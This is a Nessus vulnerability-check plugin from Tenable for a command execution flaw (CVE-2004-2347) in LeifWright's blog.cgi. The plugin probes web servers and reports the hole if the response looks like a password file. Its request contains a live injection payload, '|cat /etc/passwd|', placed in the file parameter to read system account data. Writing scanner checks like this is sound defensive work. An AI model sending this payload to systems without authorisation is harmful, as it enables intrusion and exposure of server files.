#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12033);
 script_cve_id("CVE-2004-2347");
 script_bugtraq_id(9539);
 if (defined_func("script_xref")) {
   script_xref(name:"OSVDB", value:"3793");
 }
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "LeifWright's blog.cgi command execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running LeifWright's blog.cgi - a CGI designed to
handle personal web logs (or 'blogs'). 

There is a bug in this software which may allow an attacker to execute
arbitrary commands on the remote web server with the privileges of the
web user. 

Solution : Upgrade to the latest version of blog.cgi or disable this software.
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for command execution in LeifWright's blog.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir,"/blog.cgi?submit=ViewFile&month=01&year=2004&file=|cat%20/etc/passwd|");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( buf == NULL ) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
 	security_hole(port);
	exit(0);
	}
}
